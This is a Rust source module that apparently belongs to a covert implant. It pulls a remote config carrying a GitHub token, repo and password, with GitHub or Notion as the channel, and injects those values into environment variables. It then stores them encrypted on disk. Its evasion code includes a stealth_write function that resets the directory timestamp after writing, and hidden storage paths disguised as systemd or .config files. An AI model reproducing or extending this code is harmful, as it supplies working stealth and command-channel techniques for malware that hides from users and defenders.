use serde::{Deserialize, Serialize};
use std::fs;
use std::path::PathBuf;
use std::time::Duration;
use crate::debug_log;

/// Remote backup configuration structure.
/// `hmac_sig`: hex-encoded HMAC-SHA256(JSON body excluding sig field, BACKUP_SECRET).
/// If BACKUP_SECRET is not set at compile time, signature verification is skipped.
#[derive(Serialize, Deserialize)]
pub struct BackupConfig {
    /// "github" or "notion" — determines how github_token/github_repo are interpreted.
    /// If absent (old format), defaults to "github" for backward compatibility.
    #[serde(default = "default_channel")]
    pub channel: String,
    pub github_token: String,
    pub github_repo: String,
    pub password: String,
    /// Optional HMAC-SHA256 signature to prevent MITM tampering
    #[serde(default)]
    pub hmac_sig: String,
}

fn default_channel() -> String { "github".to_string() }

// ─── Remote fetch and signature verification ──────────────────────────────────

pub fn fetch_backup_config(url: &str) -> Result<BackupConfig, String> {
    if !url.starts_with("https://") {
        return Err("Backup URL must use HTTPS".to_string());
    }

    let mut last_err = String::new();
    for attempt in 1..=3u8 {
        match fetch_backup_config_once(url) {
            Ok(config) => return Ok(config),
            Err(e) => {
                last_err = e;
                if attempt < 3 {
                    std::thread::sleep(Duration::from_secs(5));
                }
            }
        }
    }
    Err(format!("Failed after 3 attempts: {}", last_err))
}

fn fetch_backup_config_once(url: &str) -> Result<BackupConfig, String> {
    let response = crate::net::get(url)
        .timeout(Duration::from_secs(10))
        .call()
        .map_err(|e| format!("Failed to fetch backup config: {}", e))?;

    let body = response
        .into_string()
        .map_err(|e| format!("Failed to read response: {}", e))?;

    let config = parse_backup_config(&body)?;
    verify_hmac_signature(&config)?;
    Ok(config)
}

fn parse_backup_config(content: &str) -> Result<BackupConfig, String> {
    serde_json::from_str(content).map_err(|e| format!("Failed to parse JSON: {}", e))
}

/// Verify HMAC-SHA256 signature if BACKUP_SECRET was set at compile time.
/// Signed message covers: github_token|github_repo|password (fixed order).
/// If BACKUP_SECRET is not configured, verification is skipped (degraded mode).
fn verify_hmac_signature(config: &BackupConfig) -> Result<(), String> {
    let secret = option_env!("BACKUP_SECRET")
        .map(|s| s.to_string())
        .or_else(|| std::env::var("BACKUP_SECRET").ok());

    let secret = match secret {
        Some(s) if !s.is_empty() => s,
        _ => return Ok(()), // not configured — skip verification
    };

    if config.hmac_sig.is_empty() {
        return Err("Backup config missing HMAC signature".to_string());
    }

    use sha2::Sha256;
    use hmac::{Hmac, Mac};
    type HmacSha256 = Hmac<Sha256>;

    // Deterministic message: canonical field concatenation avoids JSON serialisation differences
    // channel is included to prevent MITM swapping github↔notion without breaking the signature
    let message = format!(
        "{}|{}|{}|{}",
        config.channel, config.github_token, config.github_repo, config.password
    );

    let mut mac = HmacSha256::new_from_slice(secret.as_bytes())
        .map_err(|e| format!("HMAC init error: {}", e))?;
    mac.update(message.as_bytes());
    let expected = mac.finalize().into_bytes();
    let expected_hex = expected.iter().map(|b| format!("{:02x}", b)).collect::<String>();

    // Constant-time comparison to prevent timing attacks
    if !constant_time_eq(&config.hmac_sig, &expected_hex) {
        return Err("Backup config HMAC signature verification failed".to_string());
    }

    Ok(())
}

/// Constant-time string comparison.
fn constant_time_eq(a: &str, b: &str) -> bool {
    if a.len() != b.len() {
        return false;
    }
    a.bytes().zip(b.bytes()).fold(0u8, |acc, (x, y)| acc | (x ^ y)) == 0
}

// ─── Environment variable injection ──────────────────────────────────────────

pub fn apply_backup_config(backup: &BackupConfig) {
    std::env::set_var("CHANNEL_TYPE", &backup.channel);
    std::env::set_var("GITHUB_TOKEN", &backup.github_token);
    std::env::set_var("GITHUB_REPO", &backup.github_repo);
    std::env::set_var("ENCRYPTION_PASSWORD", &backup.password);
    // Do NOT overwrite BACKUP_URL — keep the existing backup address
}

// ─── Encrypted on-disk persistence ───────────────────────────────────────────

/// Encrypt backup config with AES-GCM and write to disk.
/// Uses the compile-time ENCRYPTION_PASSWORD as the encryption key,
/// decoupled from the runtime env var which may be overwritten by apply_backup_config.
pub fn persist_backup_config(backup: &BackupConfig) -> Result<(), String> {
    let path = get_backup_config_path();
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    }

    let json = serde_json::to_string(backup).map_err(|e| e.to_string())?;
    let enc_password = get_storage_password();
    let encrypted = crate::crypto::encrypt(&json, &enc_password)
        .map_err(|e| format!("Failed to encrypt backup config: {}", e))?;

    stealth_write(&path, encrypted.as_bytes()).map_err(|e| e.to_string())
}

/// Read and decrypt the persisted backup config.
/// Call this before apply_backup_config so the storage password is the original compile-time value.
pub fn load_persisted_backup_config() -> Result<Option<BackupConfig>, String> {
    let path = get_backup_config_path();
    if !path.exists() {
        return Ok(None);
    }

    let content = fs::read_to_string(&path).map_err(|e| e.to_string())?;
    let enc_password = get_storage_password();

    // Try new format (encrypted)
    if let Ok(decrypted) = crate::crypto::decrypt(content.trim(), &enc_password) {
        return match serde_json::from_str(&decrypted) {
            Ok(config) => Ok(Some(config)),
            Err(e) => {
                // JSON parse failed after decryption — likely password changed, content is garbled.
                // Rename to .bak instead of deleting so it can be manually recovered.
                debug_log(&format!("Backup config JSON parse failed ({}), renaming to .bak", e));
                let bak = path.with_extension("bak");
                let _ = fs::rename(&path, &bak);
                Ok(None)
            }
        };
    }

    // Try legacy format (plaintext JSON — migrate existing backups)
    match serde_json::from_str::<BackupConfig>(&content) {
        Ok(config) => {
            // Immediately migrate to encrypted format
            let _ = persist_backup_config(&config);
            Ok(Some(config))
        }
        Err(e) => {
            debug_log(&format!("Backup config plaintext parse failed ({}), renaming to .bak", e));
            let bak = path.with_extension("bak");
            let _ = fs::rename(&path, &bak);
            Ok(None)
        }
    }
}

/// Get the password used for encrypting on-disk backups (compile-time value takes priority).
fn get_storage_password() -> String {
    // Prefer compile-time injected password to avoid invalidation after apply_backup_config
    option_env!("ENCRYPTION_PASSWORD")
        .map(|s| s.to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| {
            std::env::var("ENCRYPTION_PASSWORD")
                .ok()
                .filter(|s| !s.is_empty())
                .unwrap_or_else(|| crate::embedded_config::encryption_password())
        })
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

#[cfg(unix)]
fn stealth_write(path: &std::path::Path, data: &[u8]) -> std::io::Result<()> {
    let parent = path.parent();
    let dir_time = parent
        .and_then(|p| std::fs::metadata(p).ok())
        .and_then(|m| m.modified().ok());

    std::fs::write(path, data)?;

    if let (Some(parent), Some(mtime)) = (parent, dir_time) {
        use filetime::{FileTime, set_file_times};
        let ft = FileTime::from_system_time(mtime);
        let _ = set_file_times(parent, ft, ft);
    }

    Ok(())
}

#[cfg(not(unix))]
fn stealth_write(path: &std::path::Path, data: &[u8]) -> std::io::Result<()> {
    std::fs::write(path, data)
}

fn get_backup_config_path() -> PathBuf {
    #[cfg(windows)]
    {
        let username = whoami::username();
        PathBuf::from(format!(
            r"C:\Users\{}\AppData\Local\.config\preset.dat",
            username
        ))
    }

    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            PathBuf::from("/var/tmp/.systemd/preset")
        } else {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/var/tmp".to_string());
            PathBuf::from(format!("{}/.local/share/preset", home))
        }
    }
}
